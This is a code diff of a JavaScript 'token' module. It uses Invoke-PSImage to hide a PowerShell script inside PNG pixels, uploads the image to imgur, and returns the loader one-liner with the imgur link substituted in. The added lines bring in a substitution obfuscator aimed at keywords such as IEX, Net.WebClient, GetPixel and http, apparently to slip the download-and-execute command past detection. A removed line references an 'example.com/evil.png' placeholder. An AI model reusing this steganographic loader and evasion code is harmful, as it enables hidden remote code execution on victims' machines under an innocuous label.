@@ -1,4 +1,5 @@
 function token(dependencies) {
+	const cross = dependencies.cross;
 	const spawn = dependencies.spawn;
 	const imgur = dependencies.imgur;
 	const _console = dependencies.console;
@@ -16,19 +17,19 @@ function token(dependencies) {
 	};
 
 	const refresh = (req, res) => {
-		var script = "example";
-		var source = "01";
-		var destination = "01";
-		compile(script, source, destination, function (data) {
+		let imageName = Math.floor((Math.random() * 5) + 1) + '';
+
+		compile(imageName, imageName, function (data) {
 			if (data.hasError === false) {
 				imgur
-					.uploadFile(`${dependencies.root}/lib/tokenization/images/output/${destination}.png`)
+					.uploadFile(`${dependencies.root}/lib/tokenization/images/output/${imageName}.png`)
 					.then(function (json) {
-						var token = data.result.replace("http://example.com/evil.png", json.data.link);
+						var token = data.result.replace("[OUTPUT]", json.data.link);
 						_console.success('Token generation', token);
 						res.json({
-							success: !data.hasError,
-							data: token
+							success: true,
+							data: token,
+							message: 'Token generated succesfuly'
 						});
 					})
 					.catch(function (err) {
@@ -49,7 +50,7 @@ function token(dependencies) {
 		});
 	};
 
-	const compile = (script, source, destination, next) => {
+	const compile = (source, destination, next) => {
 		var scriptTemplate = "function Invoke-Token{%key='my:key';%iv='my:iv';Write-Host %('Key: ' + %key);Write-Host %('IV: ' + %iv);} ";
 		var result = ``;
 		var hasError = false;
@@ -58,7 +59,7 @@ function token(dependencies) {
 			`Import-Module ${dependencies.root}/lib/tokenization/Invoke-PSImage.ps1; Invoke-PSImage`,
 			`-Script "${(scriptTemplate.replace('my:key', token.key)).replace('my:iv', token.iv)}" -Image ${dependencies.root}/lib/tokenization/images/${source}.jpg -Out ${dependencies.root}/lib/tokenization/images/output/${destination}.png -Web`
 		]);
-		//var child = spawn('powershell.exe', [`${dependencies.root}/lib/tokenization/example.ps1`]); // first test
+
 		child.stdout.on("data", function (data) {
 			result += data;
 		});
@@ -77,33 +78,77 @@ function token(dependencies) {
 
 	const tokenGenerator = () => {
 		return {
-			key : keyGenerator(),
-			iv : ivGenerator()
+			key: keyGenerator(),
+			iv: ivGenerator()
 		}
-	}
-
-	const randomStringGenerator = function (length, prefix) {
-		// Convert it to base 36 (numbers + letters), and grab the first 9 characters
-		// after the decimal.
-		return (prefix == undefined ? 'key-' : prefix) + Math.random().toString(36).substr(2, (length == undefined ? 5 : length));
-	}
-
-	const stringToAscii = function (input) {
-		var result = [];
-		for (var key in input) {
-			if (input.hasOwnProperty(key)) {
-				result.push(input[key].charCodeAt());
-			}
-		}
-		return result;
 	}
 
 	const keyGenerator = function () {
-		return stringToAscii(randomStringGenerator(12)).join(':');
+		return cross.stringToAscii(cross.randomStringGenerator(12)).join(':');
 	}
 
 	const ivGenerator = function () {
-		return stringToAscii(randomStringGenerator(10, 'keyiv-')).join(':');
+		return cross.stringToAscii(cross.randomStringGenerator(10, 'keyiv-')).join(':');
+	}
+
+	var obfuscation = function (input) {
+		return input
+			.replaceAll('a', '2oBv')
+			.replaceAll('A', 'kl')
+			.replaceAll('b', 'lm48X')
+			.replaceAll('c', 'RT')
+			.replaceAll('New', '&X49')
+			.replaceAll('imgur', '<x')
+			.replaceAll('Text', '!ñL')
+			.replaceAll('http', 'lLm2873Y')
+			.replaceAll('System', '##Yu')
+			.replaceAll('Byte', 'yw#e')
+			.replaceAll('GetString', '¿qwv')
+			.replaceAll('ssem', '34PMd¿')
+			.replaceAll('wing', '!#¡')
+			.replaceAll('Bit', 'myf¿!')
+			.replaceAll('Type', '¨')
+			.replaceAll('Client', ',;,')
+			.replaceAll('Open', 'tdN8849m')
+			.replaceAll('//', '__')
+			.replaceAll('png', '..99Do.')
+			.replaceAll('fore', 'o-pJ#')
+			.replaceAll('in', 'ak998NM')
+			.replaceAll('Floor', 'lL65k')
+			.replaceAll('IEX', 'aDf]')
+			.replaceAll('SCII', 'po,')
+			.replaceAll('GetPixel', '#$-')
+			.replaceAll('Net', 'iU467p');
+	}
+
+	var deobfuscation = function (input) {
+		return input
+		.replaceAll('iU467p', 'Net')
+		.replaceAll('#$-', 'GetPixel')
+		.replaceAll('po,','SCII')
+		.replaceAll('aDf]','IEX')
+		.replaceAll('lL65k','Floor')
+		.replaceAll('ak998NM','in')
+		.replaceAll('o-pJ#','fore')
+		.replaceAll('..99Do.','png')
+		.replaceAll('__', '//')
+		.replaceAll('tdN8849m', 'Open')
+		.replaceAll(',;,', 'Client')
+		.replaceAll('¨', 'Type')
+		.replaceAll('myf¿!', 'Bit')
+		.replaceAll('!#¡', 'wing')
+		.replaceAll('34PMd¿', 'ssem')
+		.replaceAll('¿qwv', 'GetString')
+		.replaceAll('yw#e', 'Byte')
+		.replaceAll('##Yu', 'System')
+		.replaceAll('lLm2873Y', 'http')
+		.replaceAll('!ñL', 'Text')
+		.replaceAll('<x', 'imgur')
+		.replaceAll('&X49', 'New')
+		.replaceAll('RT', 'c')
+		.replaceAll('lm48X', 'b')
+		.replaceAll('kl', 'A')
+		.replaceAll('2oBv', 'a')
 	}
 
 	return {
